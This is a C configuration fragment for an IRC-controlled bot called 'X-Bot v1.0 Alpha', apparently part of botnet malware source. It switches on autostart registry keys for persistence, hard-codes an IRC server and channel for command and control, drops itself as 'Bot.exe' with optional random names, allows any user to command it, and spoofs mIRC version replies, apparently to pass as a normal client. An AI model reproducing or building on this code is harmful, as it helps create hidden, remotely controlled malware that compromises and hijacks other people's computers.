
bool AutoStart = TRUE;			// enable autostart registry keys
char Prefix = '~'; //.				// command prefix (one character max.)

IRCSERVERS ServerList[] = {
//	{"coetalk.anie-digital.nt", 6667, "", "#X-B","", "", ""},
	{"codetalk.anime-digital.net", 6667, "", "#X-B","", "", ""}
};


short CurrentVersion = 0;

//short CurrentServer = 0;

bool ParseTopic = TRUE;

bool ParseMotd = TRUE;

bool RandomFilename = FALSE;

short MaxRand = 6;

char Version[] = "X-Bot v1.0 Alpha";
char ID[] = "X-Bot 1.0";

char Filename[] = "Bot.exe";

char Password[] = "test";

char *AccessList[] = {
	"*@*"
};

char *VersionList[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.06 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};
